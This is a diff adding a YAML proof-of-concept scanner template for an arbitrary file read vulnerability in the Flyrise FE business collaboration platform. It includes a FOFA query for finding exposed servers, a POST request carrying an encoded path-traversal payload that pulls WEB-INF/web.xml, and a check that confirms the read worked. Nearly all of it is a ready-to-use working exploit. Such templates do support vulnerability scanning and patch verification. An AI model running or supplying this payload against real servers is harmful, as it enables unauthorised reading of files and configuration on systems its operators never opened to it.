@@ -1,0 +1,29 @@
+id: poc-yaml-flyrise-enterprise-attachment-anyfile-read
+info:
+  name: 飞企互联FE业务协作平台 attachment 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: FE业务协作平台
+  fofa: body="flyrise.stopBackspace.js"
+requests:
+- method: POST
+  path: /servlet/webchat/attachment/1
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: mailAttachment=1&attachPK=%2Fv8AMQAJAC8ACQAvAAkALwAJAC8ALgAuAC8ALgAuAC8ALgAuAC8AagBiAG8AcwBzAC8AdwBlAGIALwBmAGUALgB3AGEAcgAvAFcARQBCAC0ASQBOAEYALwB3AGUAYgAuAHgAbQBs
+  expression: 'status_code == 200 &&
+
+    contains(body,"</web-app>") &&
+
+    contains(body,"<filter>") &&
+
+    contains(body,"xml") &&
+
+    contains(headers,"attachment;filename=") &&
+
+    contains(content_type,"application/octet-stream")
+
+    '
+variables: {}
+transport: http
